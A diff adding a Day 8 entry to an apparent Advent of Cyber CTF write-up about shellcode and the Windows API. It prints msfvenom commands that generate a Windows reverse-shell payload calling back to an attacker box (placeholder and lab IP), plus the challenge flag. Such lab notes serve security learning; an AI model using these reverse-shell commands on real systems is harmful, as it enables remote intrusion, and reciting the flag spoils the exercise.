@@ -357,4 +357,34 @@ The first few transactions are to the right bank account, but towards the bottom
 
 9. `2394 6912 7723 1294`
 
+# Day 8
 
+**New Things Learnt**
+* **ShellCode**: A piece of code that's used by attackers to sneak in exploits such as buffer overflows to inject commands into a vulnerable system. ShellCode is typically written in Assembly.
+* **Windows API** (Windows Application Programming Interface) allows programs to interact with the OS, giving them access to essential system level functions such as memory management and file operations. They act as a bridge b/w the application and the OS.
+
+As usual, we follow some instructions and end up in a terminal with the command 
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell
+```
+
+where **ATTACKBOX_IP** is obviously our own unique AttackBox IP.
+
+In this case, we're creating a reverse shell for a windows machine, by following a bunch of instructions. 
+
+Now, coming to the question, we're going to follow the same instructions but with a different port `4444` 
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.194.154 LPORT=4444 -f powershell
+```
+
+After we gain remote access to the Virtual Machine, all we have to do is use the provided command `type C:\Users\glitch\Desktop\flag.txt` and we should see this
+
+![Pasted image 20241208230449](https://github.com/user-attachments/assets/2f60190e-25f0-431d-af10-94a7ca9044ef)
+
+
+ 1. The flag is `AOC{GOT_MY_ACCESS_B@CK007}`
+
+
+# Day 9
